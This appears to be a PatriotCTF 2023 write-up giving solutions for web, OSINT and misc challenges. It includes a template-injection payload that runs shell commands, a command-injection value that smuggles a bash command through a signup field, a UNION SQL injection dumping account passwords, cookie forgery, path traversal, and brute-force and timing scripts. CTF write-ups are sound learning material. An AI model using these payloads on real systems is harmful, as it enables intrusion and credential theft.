# PatriotCTF 2023

# Web

## Pick Your Starter

```jsx
// filter ' " [ bullutin
http://chal.pctf.competitivecyber.club:5555/{{cycler.__init__.__globals__.os.popen(request.args.l).read()}}?a=-config&l=ls%20/
```

## Checkmate

Use the script provided below to generate a list of legitimate passwords. These passwords can then be used in a brute force attack to ultimately retrieve the FLAG.

```jsx

// charsets
const chars = "abcdefghijklmnopqrstuvwxyz";

// 
function isValidPasswordCombo(arr) {
    var add = arr[0].charCodeAt(0) & arr[2].charCodeAt(0);
    var or = arr[1].charCodeAt(0) | arr[4].charCodeAt(0);
    var xor = arr[3].charCodeAt(0) ^ arr[5].charCodeAt(0);
    return (add === 0x60) && (or === 0x61) && (xor === 0x6);
}

// Check whether the sum of passwords is 0xbb
function isSumValid(pwd) {
    let sum = 0;
    for (let i = 0; i < pwd.length; i += 6) {
        const segment = pwd.slice(i, i + 6);
        var add = segment[0].charCodeAt(0) & segment[2].charCodeAt(0);
        var or = segment[1].charCodeAt(0) | segment[4].charCodeAt(0);
        var xor = segment[3].charCodeAt(0) ^ segment[5].charCodeAt(0);
        sum += add + or - xor;
    }
    return sum === 0xbb;
}

// dig out passwords 
for (let i = 0; i < chars.length; i++) {
    for (let j = 0; j < chars.length; j++) {
        for (let k = 0; k < chars.length; k++) {
            for (let l = 0; l < chars.length; l++) {
                for (let m = 0; m < chars.length; m++) {
                    for (let n = 0; n < chars.length; n++) {
                        const arr = [chars[i], chars[j], chars[k], chars[l], chars[m], chars[n]];
                        if (isValidPasswordCombo(arr)) {
                            const pwd = arr.join('');
                            if (isSumValid(pwd)) {
                                console.log(pwd);
                                  
                            }
                        }
                    }
                }
            }
        }
    }
```

```jsx
POST http://chal.pctf.competitivecyber.club:9096/check.php

password=sadsau
```

## Flower shop

```jsx
# Step 1
POST /modules/signup.inc.php HTTP/1.1

uid=2h0ng71&pwd=admin&wh=<@urlencode_all>https://webhook.site/60e2905c-53fd-4229-b367-9cd730ed628a;bash${IFS}-c${IFS}"cat<../admin.php>/var/www/html/123aaaazzzz.txt";<@/urlencode_all>&submit=

# Step 2
POST /modules/reset.inc.php HTTP/1.1

uid=2h0ng71&token=1c7fbe4fd0281e0f32d78c8507a6a84b&submit=
```

## One-for-All

```jsx
Flag 1:
GET / HTTP/1.1
Host: chal.pctf.competitivecyber.club:9090
Cookie: name=admin

Flag 2:
/user?id=0

Flag 3:
POST /

username= 1" union select 1,2,3,    (SELECT GROUP_CONCAT(password) from accounts);--

Flag 4:
GET /secretsforyou/..;/ HTTP/1.1

```

# OSINT

## ****Rouge Access Point****

[https://www.osintcurio.us/2019/01/15/tracking-all-the-wifi-things/](https://www.osintcurio.us/2019/01/15/tracking-all-the-wifi-things/)

[https://wigle.net/](https://wigle.net/)

[https://wigle.net/search#detailSearch](https://wigle.net/search#detailSearch)

## Karter

First step → Leveraging Google dork to get the name of the director and its PIN:

```jsx
allintext: "flipkart" "2021" "director" & before:2022-01-01 after:2020-12-01
```

Second step → find DIN at:

```jsx
https://www.tofler.in/flipkart-internet-private-limited/company/U51109KA2012PTC066107/directors
https://www.tofler.in/jonathan-marshall-collins/director/09075331
```

Third step → Ask chatgpt how to get director information from official website in India:

```jsx

Enquiry: I want to obtain information about the Director Identification Number from the government website in India. Where can I find it?

Answer: https://www.mca.gov.in/mcafoportal/enquireDIN.do
```

# Misc

## ****Flag Finder****

```jsx
from pwn import *
import time

context.log_level = 'error'

def guess_password():
    charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'
    base_password = ['0'] * 13
    print(f"[+] Base password: {''.join(base_password)}")

    count = 5
    for i in range(0, 13):
        print(f'[+] Guessing character: {i}')

        best_char = '0'
        for char in charset:
            base_password[i] = char
            password_guess = 'pctf{' + ''.join(base_password) + '}'
            
            print(f"[+] Trying password: {password_guess}")

            correct_len = test(password_guess)
            if correct_len > count:
                count += 1
                print(f"[+] Found character: {base_password}")
                break
            
    return ''.join(base_password)

def test(password):
    sh = remote('chal.pctf.competitivecyber.club', 4757)
    sh.recvuntil('What is the password: ')
    start_time = time.time()
    sh.sendline(password)
    res =  sh.recvuntil(b'There\'s been an error')

    correct_len = (len(res.split(b'\n'))-1)/2
    print(correct_len)

    duration = time.time() - start_time

    sh.close()

    return correct_len

password = guess_password()
print(f"Final password: {password}")
```